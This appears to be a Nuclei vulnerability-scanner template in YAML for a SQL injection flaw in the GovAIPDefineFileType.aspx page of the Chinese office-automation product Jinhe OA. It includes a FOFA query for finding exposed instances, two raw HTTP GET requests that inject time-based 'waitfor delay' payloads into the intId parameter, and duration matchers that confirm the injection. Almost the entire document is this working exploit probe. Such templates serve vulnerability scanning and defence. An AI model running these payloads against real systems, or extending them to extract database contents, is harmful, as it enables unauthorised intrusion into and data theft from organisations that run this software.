id: jinhe-oa-govaipdefinefiletypeaspx-sql-injection

info:
  name: "金和OA GovAIPDefineFileType.aspx文件SQL注入漏洞"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: app="金和网络-金和OA"

    该漏洞存在于金和OA系统的GovAIPDefineFileType.aspx文件中，攻击者可通过构造恶意请求利用SQL注入漏洞获取数据库敏感信息。
  tags: 金和OA

http:
- raw:
  - |
    GET /c6/Jhsoft.Web.govsetaip/GovAIPDefineFileType.aspx/?intId=1'waitfor delay'0:0:5'-- HTTP/1.1
    Host: {{Hostname}}
  - |
    GET /c6/Jhsoft.Web.govsetaip/GovAIPDefineFileType.aspx/?intId=1'waitfor delay'0:0:8'-- HTTP/1.1
    Host: {{Hostname}}
  matchers:
  - type: dsl
    dsl:
    - 'duration_1>=5 && duration_1<=6'
    - 'duration_2>=8 && duration_2<=9'
    condition: and
